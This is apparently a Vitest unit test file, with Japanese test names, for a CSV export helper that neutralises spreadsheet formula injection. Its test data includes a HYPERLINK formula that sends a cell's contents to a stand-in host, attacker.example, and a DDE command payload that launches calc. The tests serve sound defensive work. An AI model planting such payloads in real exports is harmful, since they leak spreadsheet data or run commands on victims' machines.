import { describe, expect, it } from "vitest";
import { buildCsv, csvEscape } from "@/lib/csv";

describe("csvEscape (R-01: CSV/数式インジェクション対策)", () => {
  it("先頭が = の文字列に ' を付ける(受け入れ条件)", () => {
    expect(csvEscape("=1+1")).toBe("'=1+1");
  });

  it.each([
    ["+1+1", "'+1+1"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1:A9)", "'@SUM(A1:A9)"],
    ["\tcmd", "'\tcmd"],
  ])("%j を無害化する", (input, expected) => {
    expect(csvEscape(input)).toBe(expected);
  });

  it("先頭が改行・復帰の文字列も無害化し、さらにクォートで囲む", () => {
    expect(csvEscape("\r=1+1")).toBe('"\'\r=1+1"');
    expect(csvEscape("\n=1+1")).toBe('"\'\n=1+1"');
  });

  it("HYPERLINK 攻撃文字列: 無害化したうえでCSVとして正しくクォートされる", () => {
    const attack = '=HYPERLINK("http://attacker.example/leak?x="&A1,"click")';
    expect(csvEscape(attack)).toBe(
      '"\'=HYPERLINK(""http://attacker.example/leak?x=""&A1,""click"")"'
    );
  });

  it("数式の引き金でない文字列は変更しない", () => {
    expect(csvEscape("山田太郎")).toBe("山田太郎");
    expect(csvEscape("a=b")).toBe("a=b");
    expect(csvEscape("2026-10-15T10:00:00Z")).toBe("2026-10-15T10:00:00Z");
  });

  it("数値(number)は負数でも変更しない", () => {
    expect(csvEscape(-5)).toBe("-5");
    expect(csvEscape(0)).toBe("0");
  });

  it("null / undefined は空文字", () => {
    expect(csvEscape(null)).toBe("");
    expect(csvEscape(undefined)).toBe("");
  });

  it("カンマ・ダブルクォート・改行を含む値をクォートする", () => {
    expect(csvEscape("a,b")).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape("line1\nline2")).toBe('"line1\nline2"');
    expect(csvEscape("line1\r\nline2")).toBe('"line1\r\nline2"');
  });
});

describe("buildCsv", () => {
  it("UTF-8 BOM 付き・CRLF区切りで出力する", () => {
    const csv = buildCsv([
      ["表示名", "所属"],
      ["山田", "=cmd|' /C calc'!A0"],
    ]);
    expect(csv.startsWith("\uFEFF")).toBe(true);
    expect(csv.split("\r\n")).toEqual(["\uFEFF表示名,所属", "山田,'=cmd|' /C calc'!A0"]);
  });
});
